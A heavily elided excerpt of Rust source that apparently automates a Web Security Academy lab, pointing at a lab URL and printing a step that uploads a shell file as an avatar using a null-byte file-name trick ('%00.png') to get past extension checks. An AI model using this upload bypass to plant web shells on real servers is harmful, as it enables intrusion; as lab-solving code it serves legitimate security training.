...
const LAB_URL: &str = "https://0a3b002d03e28821802bdf5a00c50001.web-security-academy.net";
...
fn main() {
    ...
    println!("{}", "OK".green());
    print!("⦗5⦘ Uploading the shell file via obfuscated file extension.. ");
    ...
    let avatar = build_avatar(shell_file, &format!("{shell_file_name}%00.png"));
